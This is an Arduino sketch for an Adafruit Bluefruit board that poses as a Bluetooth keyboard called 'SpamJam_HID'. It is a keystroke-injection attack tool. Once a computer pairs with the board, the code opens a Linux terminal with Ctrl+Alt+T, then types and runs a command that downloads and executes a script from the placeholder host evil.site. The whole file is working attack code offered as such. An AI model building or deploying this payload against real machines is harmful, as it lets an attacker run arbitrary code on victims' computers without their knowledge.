#include <bluefruit.h>
#include "Adafruit_TinyUSB.h"

BLEDis bledis;
BLEHidAdafruit blehid;

void setup() {
  Serial.begin(115200);
  while (!Serial) delay(10);

  Serial.println("🧠 Spam Jam BLE HID Booting...");

  Bluefruit.begin();
  Bluefruit.setTxPower(4);
  Bluefruit.setName("SpamJam_HID");
  Bluefruit.Periph.setConnectCallback(connect_callback);

  bledis.setManufacturer("Spam Jam Inc.");
  bledis.setModel("SJ-BLE-Key");
  bledis.begin();

  blehid.begin();
  Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);
  Bluefruit.Advertising.addTxPower();
  Bluefruit.Advertising.addAppearance(BLE_APPEARANCE_HID_KEYBOARD);
  Bluefruit.Advertising.addService(blehid);
  Bluefruit.Advertising.addName();

  Bluefruit.Advertising.start();
  Serial.println("📡 Advertising as BLE keyboard...");
}

void loop() {
  // No continuous loop needed — waits for connection
}

void connect_callback(uint16_t conn_handle) {
  Serial.println("🟢 Device paired! Injecting payload...");

  delay(1500); // Let the OS register the keyboard fully

  if (Bluefruit.connected()) {
    // Send Ctrl + Alt + T to open terminal
    blehid.keyPress(HID_KEY_CONTROL_LEFT);
    blehid.keyPress(HID_KEY_ALT_LEFT);
    blehid.keyPress('t'); // 't' key
    delay(300);
    blehid.keyRelease(); // Release all keys
    delay(800); // Wait for terminal to open

    // Payload: curl or wget-based script execution
    const char* payload = "bash -c \"$(curl -fsSL http://evil.site/script.sh)\"";
    typeText(payload);
    blehid.keyPress(HID_KEY_RETURN);
    delay(300);
    blehid.keyRelease();

    Serial.println("✅ Linux payload sent!");
  }
  
}

// Helper function to type text one char at a time
void typeText(const char* str) {
  while (*str) {
    blehid.keyPress(*str);
    delay(5);
    blehid.keyRelease();
    delay(25);
    str++;
  }
}